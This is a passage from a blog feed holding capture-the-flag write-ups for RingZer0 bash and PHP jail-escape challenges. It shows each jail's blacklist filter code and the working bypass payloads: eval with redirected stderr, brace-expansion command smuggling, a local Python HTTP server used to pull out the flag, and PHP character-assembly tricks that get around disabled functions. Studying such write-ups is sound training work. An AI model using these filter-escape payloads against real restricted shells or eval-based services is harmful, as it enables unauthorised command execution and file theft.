</code></pre></div><p>Since you are not allowed to use certain characters like &ldquo;;&rdquo;, &ldquo;&amp;&rdquo;, &ldquo;]&rdquo;, &ldquo;b&rdquo;, &ldquo;d&rdquo; and so on, you must think of some way to read
content of <code>/home/level2/flag.txt</code>. In my case the following worked:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">`&lt;/home/level2/flag.txt`
Your command is: FLAG-a78i8TFD60z3825292rJ9JK12gIyVI5P
Your input:
</code></pre></div><h1 id="level-3">Level 3</h1>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">level3@ringzer0team.com&#39;s password: 

RingZer0 Team Online CTF

BASH Jail Level 3:
Current user is uid=1002(level3) gid=1002(level3) groups=1002(level3)

Flag is located at /home/level3/flag.txt

Challenge bash code:
-----------------------------

WARNING: this prompt is launched using ./prompt.sh 2&gt;/dev/null

# CHALLENGE

function check_space {
        if [[ $1 == *[bdksc]* ]]
        then 
                return 0
        fi

        return 1
}

while :
do
        echo &#34;Your input:&#34;
        read input
        if check_space &#34;$input&#34; 
        then
                echo -e &#39;\033[0;31mRestricted characters has been used\033[0m&#39;
        else
                output=`$input` &amp;&gt;/dev/null
                echo &#34;Command executed&#34;
        fi
done 

-----------------------------
Your input:

</code></pre></div><p>The problem here is that <strong>stderr</strong> is being redirected to <code>/dev/null</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">WARNING: this prompt is launched using ./prompt.sh 2&gt;/dev/null
</code></pre></div><p>The 2nd problem is that <strong>stdout</strong> <em>and</em> <strong>stderr</strong> are also redirected to <code>/dev/null</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">output=`$input` &amp;&gt;/dev/null
</code></pre></div><p>But fortunately we are allowed to use <code>eval</code> (which doesn&rsquo;t match against the regexp in <code>check_space</code>). If I&rsquo;d execute:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">eval $(&lt;/home/level3/flag.txt)
</code></pre></div><p>this would cause an error since the shell cannot execute the command associated with the content in the flag file. But since <strong>stderr</strong> is redirected I had to redirect again to sth else, like <strong>stdin</strong> (0):</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Your input:
eval $(&lt;/home/level3/flag.txt) 2&gt;&amp;0
./real.sh: line 39: FLAG-s9wXyc9WKx1X6N9G68fCR0M78sx09D3j: command not found
Command executed
</code></pre></div><h1 id="level-4">Level 4</h1>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">level4@ringzer0team.com&#39;s password: 

RingZer0 Team Online CTF

BASH Jail Level 4:
Current user is uid=1003(level4) gid=1003(level4) groups=1003(level4)

Flag is located at /home/level4/flag.txt

Challenge bash code:
-----------------------------

WARNING: this prompt is launched using ./prompt.sh 2&gt;/dev/null

# CHALLENGE

function check_space {
        if [[ $1 == *[bdksc&#39;/&#39;&#39;&lt;&#39;&#39;&gt;&#39;&#39;&amp;&#39;&#39;$&#39;]* ]]
        then 
                return 0
        fi

        return 1
}

while :
do
        echo &#34;Your input:&#34;
        read input
        if check_space &#34;$input&#34; 
        then
                echo -e &#39;\033[0;31mRestricted characters has been used\033[0m&#39;
        else
                output=`$input &lt; /dev/null` &amp;&gt;/dev/null
                echo &#34;Command executed&#34;
        fi
done 

-----------------------------
Your input:
</code></pre></div><p>Since a lot of characters are not allowed, stdout/stderr redirection is not working anymore. And regarding <code>&lt; /dev/null</code>: This is mostly used to <a href="http://stackoverflow.com/questions/19955260/what-is-dev-null-in-bash">detach a process from a tty</a>. That means we are allowed to launch some daemons. After some try &amp; failure I thought of starting some web server and then &ldquo;downloading&rdquo; the flag file using a GET request. At that point I had 2 problems:</p>
<ul>
<li>start a server</li>
<li><strong>somehow</strong> GET the flag.txt file</li>
</ul>
<p>Starting a web server was easy:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Your input:
python -m SimpleHTTPServer
</code></pre></div><p>Now I had to download the file using <code>http://127.0.0.1:8000</code>. Then I&rsquo;ve realized that for <strong>level1</strong> I had a <code>bash</code> I could use to download the file:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">level1@lxc17-bash-jail:~$ netstat -tan 1&gt;&amp;0
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0    316 10.0.3.26:22            195.178.101.66:35930    ESTABLISHED
tcp        0      0 10.0.3.26:22            195.178.101.66:13279    ESTABLISHED
tcp6       0      0 :::22                   :::*                    LISTEN     
</code></pre></div><p>As you can see the web server is running on port <code>8000</code>. Since <code>wget</code>, <code>curl</code> or other HTTP clients were not available, I had to run python again in order to get the file:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">level1@lxc17-bash-jail:~$ python3 1&gt;&amp;0
Python 3.4.3 (default, Oct 14 2015, 20:28:29) 
[GCC 4.8.4] on linux
Type &#34;help&#34;, &#34;copyright&#34;, &#34;credits&#34; or &#34;license&#34; for more information.
&gt;&gt;&gt; import urllib.request
&gt;&gt;&gt; urllib.request.urlopen(&#34;http://127.0.0.1:8000/flag.txt&#34;).read()
b&#39;FLAG-OTQKB0274fwtxk3v2rTLCd0l5v7KNp7F\n&#39;
&gt;&gt;&gt; quConnection to ringzer0team.com closed.
</code></pre></div><h1 id="level-5">Level 5</h1>
<p>The last one was indeed <strong>very difficult</strong>. But before going into details, let&rsquo;s have a look at the prompt:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">RingZer0 Team Online CTF

BASH Jail Level 5:
Current user is uid=1004(level5) gid=1004(level5) groups=1004(level5)

Flag is located at /home/level5/flag.txt

Challenge bash code:
-----------------------------

WARNING: this prompt is launched using ./prompt.sh 2&gt;/dev/null

# CHALLENGE

function check_space {
        if [[ $1 == *[bdksctr&#39;?&#39;&#39;*&#39;&#39;/&#39;&#39;&lt;&#39;&#39;&gt;&#39;&#39;&amp;&#39;&#39;$&#39;]* ]]
        then 
                return 0
        fi

        return 1
}

while :
do
        echo &#34;Your input:&#34;
        read input
        if check_space &#34;$input&#34; 
        then
                echo -e &#39;\033[0;31mRestricted characters has been used\033[0m&#39;
        else
                output=`$input &lt; /dev/null` &amp;&gt;/dev/null
                echo &#34;Command executed&#34;
        fi
done 

-----------------------------
Your input:

</code></pre></div><p>So obvisouly a lot of characters are not allowed to be used. This makes the challenge very hard since also redirects (&gt;,&lt;,&amp;) are not possible anymore. So even one has succeeded in reading the file, the OUTPUT has to be redirected to some other device. But the slash (/) is also not allowed, making it hard to specify the output (e.g. /dev/shm/buffer).</p>
<p>Having that in mind I&rsquo;ve tried several things:</p>
<h2 id="vim">Vim</h2>
<p>The idea was to start vim, <strong>read</strong> the flag.txt and write the buffer to sth like <code>/dev/shm/buffervim</code>. But vim has some problems starting when STDIN=<code>/dev/null</code>. At the beginning I saw <code>vim</code> starting but then it disapeared suddenly. It took me a file to find out that starting vim with STDIN != some tty would be tricky.</p>
<h2 id="create-another-file">Create another file</h2>
<p>Since I was able to read the file easily:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ uniq flag.[a-z][a-z][a-z]
</code></pre></div><p>&hellip; I thought I could create a new file inside <code>/home/level5/</code> by using <code>uniq</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ uniq flag.[a-z][a-z][a-z] new_file
</code></pre></div><p>That didn&rsquo;t work and it took some some while to understand <strong>why</strong>. Using <code>lsattr</code> I&rsquo;ve checked the attributes on <code>/home/level5</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">level1@lxc17-bash-jail:/home/level5$ lsattr -a&gt;&amp;0
----i--------e-- ./.
----i--------e-- ./..
----i--------e-- ./real.sh
lsattr: Permission denied While reading flags on ./flag.txt
----i--------e-- ./prompt.sh
----i--------e-- ./.bash_logout
----i--------e-- ./.bashrc
----i--------e-- ./.profile
level1@lxc17-bash-jail:/home/level5$ 

</code></pre></div><p>As you can see <code>/home/level5</code> is set to <strong>immutable</strong> (i) which means that I can&rsquo;t modify files in that directory or create new ones.</p>
<h2 id="use-bash-magic-voodoo">Use bash magic voodoo</h2>
<p>Desperately searching for some solution, I&rsquo;ve asked <a href="https://ringzer0team.com/profile/8593/maxenced">maxenced</a> (who was the last one having solved this level)  for some additional hint. BTW: I&rsquo;ve &ldquo;bought&rdquo; the hint for this hint very early, but it didn&rsquo;t help a lot. Anyway&hellip; He told me I should use <strong>bash brace expansions</strong>.
Okay, so let&rsquo;s have a look and see what we can do using them:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ echo {a..z}
a b c d e f g h i j k l m n o p q r s t u v w x y z

$ echo {1..10..2}
1 3 5 7 9

$ echo {o..u}ython
oython python qython rython sython tython uython
</code></pre></div><p>So obvisouly we can <strong>bypass</strong> the restricted characters by simpling iterating through a range of
characters. Now the next step was to find a way how to <strong>expand shell commands</strong> (and this was the
most imporant part - thx again <a href="https://ringzer0team.com/profile/8593/maxenced">maxenced</a>). I&rsquo;ve tried sth
like:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ eval {o..u}ython
bash: oython: command not found
</code></pre></div><p><code>eval</code> was <strong>not</strong> expanding the commands. Then I&rsquo;ve tried sth different:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ `echo echo {o..u}ython\\;`
oython; python; qython; rython; sython; tython; uython;
</code></pre></div><p>Now let me explain the changes:</p>
<ul>
<li>I&rsquo;ve added backticks to run the commands</li>
<li>I&rsquo;ve added <strong>\;</strong> at the end which simply adds a semicolon (;) at the end of each expansion</li>
</ul>
<p>If I change the <code>echo</code> to <code>eval</code>, then <code>eval</code> will basically run:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">oython; python; qython; rython; sython; tython; uython;
</code></pre></div><p>Afterwards I&rsquo;ve found out that <code>python</code> refused to start if STDIN = <code>/dev/null</code> (the same as with <code>vim</code>). Then
I remembered the solution in a previous level where I&rsquo;ve start a <strong>HTTP server</strong> (using <code>python</code>) to &ldquo;download&rdquo;
the flag.txt. So all I wanted to run was:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ python -m SimpleHTTPServer
</code></pre></div><p>As you may have noticed &ldquo;SimpleHTTPServer&rdquo; contains restricted characters like <strong>r</strong>. So we&rsquo;ll have to use <em>brace expansion</em> again:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ `echo echo {u..o}ython\ -m\ SimpleHTTPSe{u..o}ve{o..u}\\;`
...
</code></pre></div><p>The next step was to properly escape the backslashes to make sure that eval is executing the right thing. So the final payload was:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ eval eval py{o..u}hon\\ -m\\ SimpleHTTPSe{q..v}ve{q..v}\\; 
</code></pre></div><p>I would also want to thank David, Ralph and Tobias for their awesome ideas and the great hacking session we had on Friday :)</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>ringzer0 CTF - Jail Escaping PHP</title>
      <link>https://blog.dornea.nu/2016/06/20/ringzer0-ctf-jail-escaping-php/</link>
      <pubDate>Mon, 20 Jun 2016 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2016/06/20/ringzer0-ctf-jail-escaping-php/</guid>
      <content:encoded><![CDATA[<p>Here are my solutions for the <a href="https://ringzer0team.com">ringzer0</a> <strong>Jail Escaping</strong> PHP challenges.</p>
<h1 id="level-1">Level 1</h1>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.php" data-lang=".php">RingZer0 Team Online CTF

PHP Jail Level 1:
Current user is uid=1000(level1) gid=1000(level1) groups=1000(level1)

Flag is located at /home/level1/flag.txt

Challenge PHP code:
-----------------------------

<span style="color:#cd2828;font-weight:bold">&lt;?php</span>
array_shift(<span style="color:#40ffff">$_SERVER</span>[<span style="color:#ed9d13">&#39;argv&#39;</span>]);
<span style="color:#40ffff">$var</span> = implode(<span style="color:#ed9d13">&#34; &#34;</span>, <span style="color:#40ffff">$_SERVER</span>[<span style="color:#ed9d13">&#39;argv&#39;</span>]);

<span style="color:#6ab825;font-weight:bold">if</span>(<span style="color:#40ffff">$var</span> == <span style="color:#6ab825;font-weight:bold">null</span>) <span style="color:#6ab825;font-weight:bold">die</span>(<span style="color:#ed9d13">&#34;PHP Jail need an argument</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>);

<span style="color:#6ab825;font-weight:bold">function</span> <span style="color:#447fcf">filter</span>(<span style="color:#40ffff">$var</span>) {
        <span style="color:#6ab825;font-weight:bold">if</span>(preg_match(<span style="color:#ed9d13">&#39;/(`|open|exec|pass|system|\$|\/)/i&#39;</span>, <span style="color:#40ffff">$var</span>)) {
                <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#6ab825;font-weight:bold">false</span>;
        }
        <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#6ab825;font-weight:bold">true</span>;
}
<span style="color:#6ab825;font-weight:bold">if</span>(filter(<span style="color:#40ffff">$var</span>)) {
        <span style="color:#6ab825;font-weight:bold">eval</span>(<span style="color:#40ffff">$var</span>);
        <span style="color:#6ab825;font-weight:bold">echo</span> <span style="color:#ed9d13">&#34;Command executed&#34;</span>;
} <span style="color:#6ab825;font-weight:bold">else</span> {
        <span style="color:#6ab825;font-weight:bold">echo</span> <span style="color:#ed9d13">&#34;Restricted characters has been used&#34;</span>;
}
<span style="color:#6ab825;font-weight:bold">echo</span> <span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>;
<span style="color:#cd2828;font-weight:bold">?&gt;</span>

-----------------------------
Your input:
</code></pre></div><p>Pretty simple:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Your input:
echo(file_get_contents(&#39;flag.txt&#39;));
FLAG-sW66QEY4y6724723c7w1i0oMt179E75y
</code></pre></div><h1 id="level-2">Level 2</h1>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.php" data-lang=".php">PHP Jail Level 2
Current user is uid=1001(level2) gid=1001(level2) groups=1001(level2)

Flag is located at /home/level2/flag.txt

Challenge PHP code:
-----------------------------

<span style="color:#cd2828;font-weight:bold">&lt;?php</span>
array_shift(<span style="color:#40ffff">$_SERVER</span>[<span style="color:#ed9d13">&#39;argv&#39;</span>]);
<span style="color:#40ffff">$var</span> = implode(<span style="color:#ed9d13">&#34; &#34;</span>, <span style="color:#40ffff">$_SERVER</span>[<span style="color:#ed9d13">&#39;argv&#39;</span>]);

<span style="color:#6ab825;font-weight:bold">if</span>(<span style="color:#40ffff">$var</span> == <span style="color:#6ab825;font-weight:bold">null</span>) <span style="color:#6ab825;font-weight:bold">die</span>(<span style="color:#ed9d13">&#34;PHP Jail need an argument</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>);

<span style="color:#6ab825;font-weight:bold">function</span> <span style="color:#447fcf">filter</span>(<span style="color:#40ffff">$var</span>) {
        <span style="color:#6ab825;font-weight:bold">if</span>(preg_match(<span style="color:#ed9d13">&#39;/(\/|a|c|s|require|include|flag|eval|file)/i&#39;</span>, <span style="color:#40ffff">$var</span>)) {
                <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#6ab825;font-weight:bold">false</span>;
        }
        <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#6ab825;font-weight:bold">true</span>;
}
<span style="color:#6ab825;font-weight:bold">if</span>(filter(<span style="color:#40ffff">$var</span>)) {
        <span style="color:#6ab825;font-weight:bold">eval</span>(<span style="color:#40ffff">$var</span>);
        <span style="color:#6ab825;font-weight:bold">echo</span> <span style="color:#ed9d13">&#34;Command executed&#34;</span>;
} <span style="color:#6ab825;font-weight:bold">else</span> {
        <span style="color:#6ab825;font-weight:bold">echo</span> <span style="color:#ed9d13">&#34;Restricted characters has been used&#34;</span>;
}
<span style="color:#6ab825;font-weight:bold">echo</span> <span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>;
<span style="color:#cd2828;font-weight:bold">?&gt;</span>

-----------------------------
Your input:

</code></pre></div><p>Since some functions (like <code>fread</code>, <code>file_get_contents</code> are not allowed) we can use <code>popen</code> to start an external command in order to
read the flag.txt:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">popen(&#34;vim&#34;, &#34;w&#34;);
</code></pre></div><p>This <code>vim</code> is started and we can read the <code>flag.txt</code> by loading it into the buffer:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">:r flag.txt
</code></pre></div><p>Flag: FLAG-YlxV8cCg84zvUtt595dla5un9EW57BCL</p>
<h1 id="level-3">Level 3</h1>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">RingZer0 Team Online CTF

PHP Jail Level 3:
Current user is uid=1002(level3) gid=1002(level3) groups=1002(level3)

Flag is located at /home/level3/flag.txt

Challenge PHP code:
-----------------------------

WARNING: the PHP interpreter is launched using php -c php.ini jail.php.
The php.ini file contain &#34;disable_functions=exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,readfile,require,require_once,include,include_once,file&#34;

&lt;?php
array_shift($_SERVER[&#39;argv&#39;]);
$var = implode(&#34; &#34;, $_SERVER[&#39;argv&#39;]);

if($var == null) die(&#34;PHP Jail need an argument\n&#34;);

function filter($var) {
        if(preg_match(&#39;/(`|\.|\$|\/|a|c|s|require|include)/i&#39;, $var)) {
                return false;
        }
        return true;
}
if(filter($var)) {
        eval($var);
        echo &#34;Command executed&#34;;
} else {
        echo &#34;Restricted characters has been used&#34;;
}
echo &#34;\n&#34;;
?&gt;

-----------------------------

</code></pre></div><p>Since a lot of functions have been disabled, one must find a function that is <strong>allowed</strong> and doesn&rsquo;t contain any restricted characters. <a href="http://php.net/manual/en/function.highlight-file.php">highlight_file</a> is one of those functions:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.php" data-lang=".php">Your input:
highlight_file(glob(&#34;fl*txt&#34;)[0]);
&lt;<span style="color:#6ab825;font-weight:bold">code</span>&gt;&lt;<span style="color:#6ab825;font-weight:bold">span</span> <span style="color:#bbb">style</span>=<span style="color:#ed9d13">&#34;color: #000000&#34;</span>&gt;
FLAG-D6jg9230H05II3ri5QB7L9166gG73l8H&lt;<span style="color:#6ab825;font-weight:bold">br</span> /&gt;&lt;/<span style="color:#6ab825;font-weight:bold">span</span>&gt;
&lt;/<span style="color:#6ab825;font-weight:bold">code</span>&gt;Command executed
</code></pre></div><h1 id="level-4">Level 4</h1>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">RingZer0 Team Online CTF

PHP Jail Level 4:
Current user is uid=1003(level4) gid=1003(level4) groups=1003(level4)

Flag is located at /home/level4/flag.txt

Challenge PHP code:
-----------------------------

WARNING: the PHP interpreter is launched using php -c php.ini jail.php.
The php.ini file contain &#34;disable_functions=exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,readfile,require,require_once,include,include_once,file&#34;

&lt;?php
array_shift($_SERVER[&#39;argv&#39;]);
$var = implode(&#34; &#34;, $_SERVER[&#39;argv&#39;]);

if($var == null) die(&#34;PHP Jail need an argument\n&#34;);

function filter($var) {
        if(preg_match(&#39;/(\&#39;|\&#34;|`|\.|\$|\/|a|c|s|require|include)/i&#39;, $var)) {
                return false;
        }
        return true;
}
if(filter($var)) {
        eval($var);
        echo &#34;Command executed&#34;;
} else {
        echo &#34;Restricted characters has been used&#34;;
}
echo &#34;\n&#34;;
?&gt;

-----------------------------
Your input:

</code></pre></div><p>As you can notice <code>highlight_source</code> is <em>not</em> disabled, so you can use sth like:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.php" data-lang=".php">highlight_source(&#34;flag.txt&#34;);
</code></pre></div><p>However, double quotes and the characters &ldquo;a&rdquo; and &ldquo;.&rdquo; are not allowed. Next idea was to use <code>glob</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.php" data-lang=".php">highlight_source(glob(&#34;*&#34;)[4]);
</code></pre></div><p>But again: Double quotes and the &ldquo;*&rdquo; character are not allowed. Since my solution is kind of complicated, I&rsquo;ll try to explain what
my thoughts were:</p>
<p>a) I needed the &ldquo;/&rdquo; character (is also not allowed)
b) I needed the &ldquo;a&rdquo; character
c) I needed a way to define a string without using double quotes
d) I wanted to somehow build the string &ldquo;/home/level4/flag.txt&rdquo; with allowed characters and use it with <code>glob</code></p>
<p>Now the solutions to every particular problem:</p>
<p>a) Using <code>phpinfo();</code> I&rsquo;ve found out that there were some <em>environment</em> variables I could use to extract the &ldquo;/&rdquo;. Then I ran:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.php" data-lang=".php">print_r(getenv(HOME));
PHP Notice:  Use of undefined constant HOME - assumed &#39;HOME&#39; in /home/level4/jail.php(14) : eval()&#39;d code on line 1
/home/level4Command executed
</code></pre></div><p>Then I could extract the &ldquo;/&rdquo; by using</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.php" data-lang=".php">getenv(HOME)[0];
</code></pre></div><p>b) PHP has some <strong>predefined constants</strong> like <code>__FILE__</code>, <code>__DIR__</code> and so on:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.php" data-lang=".php">print_r(__FILE__);
/home/level4/jail.php(14) : eval()&#39;d codeCommand executed
</code></pre></div><p>Using <code>__FILE__</code> I can extract &ldquo;a&rdquo; and &ldquo;.&rdquo;.</p>
<p>c) Using <code>define()</code>, <code>implode()</code>/<code>explode()</code> one could define contants as strings and use array operations to extract/concat characters:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.php" data-lang=".php">define(HEY,__FILE__);print_r(explode(getenv(HOME)[0],HEY));
PHP Notice:  Use of undefined constant HEY - assumed &#39;HEY&#39; in /home/level4/jail.php(14) : eval()&#39;d code on line 1
PHP Notice:  Use of undefined constant HOME - assumed &#39;HOME&#39; in /home/level4/jail.php(14) : eval()&#39;d code on line 1
Array
(
    [0] =&gt; 
    [1] =&gt; home
    [2] =&gt; level4
    [3] =&gt; jail.php(14) : eval()&#39;d code
)
</code></pre></div><p>By using <code>implode()</code> you can then concatenate several characters:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.php" data-lang=".php">print_r(implode(getenv(HOME)[0],[getenv(HOME)[0],home,level4,file]));
PHP Notice:  Use of undefined constant HOME - assumed &#39;HOME&#39; in /home/level4/jail.php(14) : eval()&#39;d code on line 1
PHP Notice:  Use of undefined constant HOME - assumed &#39;HOME&#39; in /home/level4/jail.php(14) : eval()&#39;d code on line 1
PHP Notice:  Use of undefined constant home - assumed &#39;home&#39; in /home/level4/jail.php(14) : eval()&#39;d code on line 1
PHP Notice:  Use of undefined constant level4 - assumed &#39;level4&#39; in /home/level4/jail.php(14) : eval()&#39;d code on line 1
PHP Notice:  Use of undefined constant file - assumed &#39;file&#39; in /home/level4/jail.php(14) : eval()&#39;d code on line 1
//home/level4/fileCommand executed
</code></pre></div><p>d) Now if you put a), b) and c) together you should be able to build your payload:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.php" data-lang=".php">define(HEY, __FILE__); highlight_file(implode(getenv(HOME)[0],[getenv(HOME)[0],home,level4,getenv(HOME)[0],implode(explode(getenv(HOME)[0],HEY)[0], [fl,explode(getenv(HOME)[0],HEY)[3][1],g,explode(getenv(HOME)[0],HEY)[3][4],t,x,t])])); 
PHP Notice:  Use of undefined constant HEY - assumed &#39;HEY&#39; in /home/level4/jail.php(14) : eval()&#39;d code on line 1
PHP Notice:  Use of undefined constant HOME - assumed &#39;HOME&#39; in /home/level4/jail.php(14) : eval()&#39;d code on line 1
PHP Notice:  Use of undefined constant HOME - assumed &#39;HOME&#39; in /home/level4/jail.php(14) : eval()&#39;d code on line 1
PHP Notice:  Use of undefined constant home - assumed &#39;home&#39; in /home/level4/jail.php(14) : eval()&#39;d code on line 1
PHP Notice:  Use of undefined constant level4 - assumed &#39;level4&#39; in /home/level4/jail.php(14) : eval()&#39;d code on line 1
PHP Notice:  Use of undefined constant HOME - assumed &#39;HOME&#39; in /home/level4/jail.php(14) : eval()&#39;d code on line 1
PHP Notice:  Use of undefined constant HOME - assumed &#39;HOME&#39; in /home/level4/jail.php(14) : eval()&#39;d code on line 1
PHP Notice:  Use of undefined constant fl - assumed &#39;fl&#39; in /home/level4/jail.php(14) : eval()&#39;d code on line 1
PHP Notice:  Use of undefined constant HOME - assumed &#39;HOME&#39; in /home/level4/jail.php(14) : eval()&#39;d code on line 1
PHP Notice:  Use of undefined constant g - assumed &#39;g&#39; in /home/level4/jail.php(14) : eval()&#39;d code on line 1
PHP Notice:  Use of undefined constant HOME - assumed &#39;HOME&#39; in /home/level4/jail.php(14) : eval()&#39;d code on line 1
PHP Notice:  Use of undefined constant t - assumed &#39;t&#39; in /home/level4/jail.php(14) : eval()&#39;d code on line 1
PHP Notice:  Use of undefined constant x - assumed &#39;x&#39; in /home/level4/jail.php(14) : eval()&#39;d code on line 1
PHP Notice:  Use of undefined constant t - assumed &#39;t&#39; in /home/level4/jail.php(14) : eval()&#39;d code on line 1
&lt;<span style="color:#6ab825;font-weight:bold">code</span>&gt;&lt;<span style="color:#6ab825;font-weight:bold">span</span> <span style="color:#bbb">style</span>=<span style="color:#ed9d13">&#34;color: #000000&#34;</span>&gt;
FLAG-X9uF51b0X570f616897kLN3It3K6m63c&lt;<span style="color:#6ab825;font-weight:bold">br</span> /&gt;&lt;/<span style="color:#6ab825;font-weight:bold">span</span>&gt;
&lt;/<span style="color:#6ab825;font-weight:bold">code</span>&gt;Command executed
</code></pre></div><p>I know&hellip; Very complicated (I&rsquo;ve seen solutions using <code>hex2bin()</code>) but it does its job :)</p>
<h1 id="level-5">Level 5</h1>
